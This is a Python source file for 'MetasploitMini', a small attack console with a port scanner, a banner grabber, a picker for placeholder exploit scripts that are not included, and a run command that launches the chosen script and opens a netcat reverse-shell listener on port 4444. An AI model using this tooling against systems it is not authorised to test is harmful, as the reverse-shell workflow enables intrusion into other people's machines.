import cmd
import socket
import os
import pyfiglet
from termcolor import colored

banner = pyfiglet.figlet_format("MetasploitMini")
print(colored(banner, 'blue'))
print("Made by: Tommaso Bona")
print("Github: https://github.com/ParzivalHack")
print("Tip: try running the 'help' command.")

class MyCLI(cmd.Cmd):
    prompt = colored("MetasploitMini~$ ", 'red')
    
    def __init__(self):
        super().__init__()
        self.target = ""
      
    def  do_help(self, arg):
    	print(colored("Commands List:", 'blue'))
    	print(colored("- help, to show this help message", 'blue'))
    	print(colored("- settarget, to set a global target", 'blue'))
    	print(colored("- scan, to use the Port Scanner", 'blue'))
    	print(colored("- banner, to use the Banner Grabber", 'blue'))
    	print(colored("- setexploit, to set a global exploit", 'blue'))
    	print(colored("- setip, to set the attacker IP for the reverse shell", 'blue'))
    	print(colored("- run, to run an exploit", 'blue'))
    	print(colored("- exit, to exit MetasploitMini", 'blue'))
    	
    def do_setip(self, arg):
        self.attacker_ip = arg
        print(colored(f"Attacker IP set to {self.attacker_ip}", 'blue'))	
    
    def do_scan(self, arg):
        if not self.target:
            print("Target not set. Use 'settarget <target>' to set the target IP or website.")
            return
        
        args = arg.split()
        if len(args) < 1:
            print("Usage: scan <port range>")
            return
        start_port, end_port = args[0].split("-")
        start_port = int(start_port)
        end_port = int(end_port)
        
        for port in range(start_port, end_port + 1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            result = sock.connect_ex((self.target, port))
            if result == 0:
                print(f"Port {port} is open")
            sock.close()
            
    def do_banner(self, arg):
        if not self.target:
            print("Target not set. Use 'settarget <target>' to set the target IP or website.")
            return
        
        args = arg.split()
        if len(args) < 1:
            print("Usage: banner <port>")
            return
        port = int(args[0])
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.target, port))
        sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
        response = sock.recv(1024)
        print(f"Banner: {response.decode('utf-8')}")
        sock.close()
        
    def do_setexploit(self, arg):
        exploits = ["exploit1.py", "exploit2.py", "exploit3.py", "exploit4.py", "exploit5.py"]
        args = arg.split()
        if len(args) < 1:
            print("Usage: setexploit <exploit number>")
            return
        exploit_num = int(args[0])
        if exploit_num < 1 or exploit_num > len(exploits):
            print("Invalid exploit number")
            return
        self.exploit = exploits[exploit_num-1]
        print(f"Exploit set to {self.exploit}")

    def do_run(self, arg):
            if not self.target:
            	print("Target not set. Use 'settarget <target>' to set the target IP or website.")
            	return
            if not self.exploit:
            	print("Exploit not set. Use 'setexploit <exploit number>' to set the exploit.")
            	return
            os.system(f"python {self.exploit} {self.attacker_ip} &")
            os.system("nc -lvp 4444") 
        
    def do_settarget(self, arg):
        self.target = arg
        print(f"Target set to {self.target}")
        
    def do_exit(self, arg):
        return True

if __name__ == "__main__":
    cli = MyCLI()
    cli.cmdloop()
